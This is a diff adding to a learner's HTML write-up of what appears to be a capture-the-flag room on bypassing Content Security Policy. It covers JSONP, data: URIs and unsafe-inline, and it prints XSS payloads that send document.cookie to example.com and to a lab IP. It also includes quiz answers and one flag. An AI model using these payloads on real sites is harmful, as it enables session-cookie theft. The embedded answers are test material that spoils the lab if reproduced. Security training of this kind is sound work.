@@ -128,26 +128,141 @@ Note that if you serve JSONP endpoints on your website, you may need to take add
 <p>4.2. Can you include the URLs of the permitted scripts directly in your security policy? (Yes / No)<br>
 <code>Yes</code></p>
 
+<br>
+<h2>Task 5 . Bypassing a Content Security Policy</h2>
+<p>Since we now know how to create content security policies, let's learn how to find bypasses for them.<br>
 
+If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using Google's CSP Evaluator. It's able to detect various mistakes in any CSP configuration.</p>
+
+<h3>JSONP endpoints</h3>
+<p>﻿Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The JSONBee repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.</p>
+
+<h3>Unsafe CSP configurations</h3>
+<p>Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: <code><script src="data:application/javascript,alert(1)"></script></code>.</p>
+
+<h3>Exfiltration</h3>
+<p>﻿To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as Beeceptor to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.<br>
+
+If you prefer running a web server for exfiltration locally, you can set up a simple HTTP server using python by running <code>python -m SimpleHTTPServer</code> or <code>python3 -m http.server</code>.<br>
+
+If the website you're exploiting allows AJAX requests (via connect-src) to anywhere, you can create a fetch request to your server like so:<br>
+
+- <code><script>fetch(`http://example.com/${document.cookie}`)</script><br>
+
+When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:<br><br>
+
+
+<img width="1005" height="166" alt="image" src="https://github.com/user-attachments/assets/6c965f4b-559e-450b-828c-1e4baac99569" /><br><br>
+
+If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the <code>connect-src</code> policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.<br><br>
+
+For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so: <code><script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script></code>.
+
+<p><em>Answer the question below</em></p>
+
+<p>5.1. If Ajax/XHR requests are blocked, can we still exfiltrate sensitive information? (Yes / No)<br>
+<code>Yes</code></p>
+
+<br>
+<h2>Task 6 . CSP Sandbox</h2>
+<p>Time to put your practice to test! I've created a VM that is intentionally vulnerable to XSS but uses various content security policies to mitigate it. You should be able to test what you've learned so far. It consists of 10 challenges, 7 of which are attack and 3 are defend, and also a playground where you can test your own CSP configurations.<br><br>
+
+[ Start Machine ]<br><br>
+
+You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
+
+<p><em>Answer the question below</em></p>
+
+<p>5.1. I have deployed the CSP Sandbox machine.<br>
+<code>Yes</code></p>
+
+<br>
+<h2>Task 7 . CSP Sandbox :: Attack challenges</h2>
+<p>To deploy the machine, go to the <strong>CSP Sandbox</strong> task.<br><br>
+
+<strong>Attack</strong> challenges require you to bypass the CSP header sent by the webpage and exfiltrate the administrator's cookies. For methods on how you can achieve this, refer to the Bypassing CSP task of this room.<br><br>
+
+<em>For verification, all challenges are accessed by a bot locally (localhost)</em>.</p>
+
+<p><em>Answer the questiona below</em></p>
+
+<p>7.1. Flag for attack-1<br>
+<code>____</code></p>
+
+<br>
+
+<p>
+
+- naviagted to <code>xx.xxx.xxx.xxx:30001</code></p>
+
+<br>
+
+<img width="1250" height="787" alt="image" src="https://github.com/user-attachments/assets/789a62ae-0845-4312-b4ec-decfc28d791c" />
+
+<br>
+
+<p>
+
+- navigated to <code>https://csp-evaluator.withgoogle.com</code> to checke if the policy has any potential bypass vectors in it<br>
+- pasted <code>xx.xxx.xxx.xxx:30001</code><br>
+- clicked <code>CHECK CSP<br>
+- identified that there is <code>default-src<br>: <code>*</code> and <code>‘unsafe-inline’</code><br>
+- reviewd that the directive <code>default-src<br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
+- set up an http.server<br>>
+- type a payload <code><script>fetch(`http://10.201.25.139:8000/${document.cookie}`)</script></code><br>
+- clicked <code>Submit Query</code.<br>
+- received the flag and URL decoded it: <code>THM%7BTh4t_W4s_Pr3tty_3asy%7D</code> = <code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>
 
 <br>
 <br>
-<h2>Bypassing a Content Security Policy</h2>
 
-
-<br>
-<br>
-<h2>CSP Sandbox</h2>
-
+<img width="1253" height="700" alt="image" src="https://github.com/user-attachments/assets/74a6a4ef-47ad-4a1d-ac37-ad50e1b357e2" />
 
 <br>
 <br>
-<h2>CSP Sandbox :: Attack challenges</h2>
 
+<img width="921" height="103" alt="image" src="https://github.com/user-attachments/assets/41448af8-883f-4178-bcb3-91e12838b414" />
 
 <br>
 <br>
-<h2>CSp Sandbox :: Defend Challenges</h2>
+
+<img width="1084" height="116" alt="image" src="https://github.com/user-attachments/assets/bafc9f16-ba1f-4409-9785-2812fe8a8bd4" />
+
+<br>
+<br>
+
+
+<p>7.2. Flag for attack-2<br>
+<code>____</code></p>
+
+<br>
+
+<p>7.3. Flag for attack-3<br>
+<code>____</code></p>
+
+<br>
+
+<p>7.4. Flag for attack-4<br>
+<code>____</code></p>
+
+<br>
+
+<p>7.5. Flag for attack-5<br>
+<code>____</code></p>
+
+<br>
+
+<p>7.6. Flag for attack-6<br>
+<code>____</code></p>
+
+<br>
+
+<p>7.7. Flag for attack-7<br>
+<code>____</code></p>
+
+
+<br>
+<h2>Task 8 . CSP Sandbox :: Defend Challenges</h2>
 
 
 
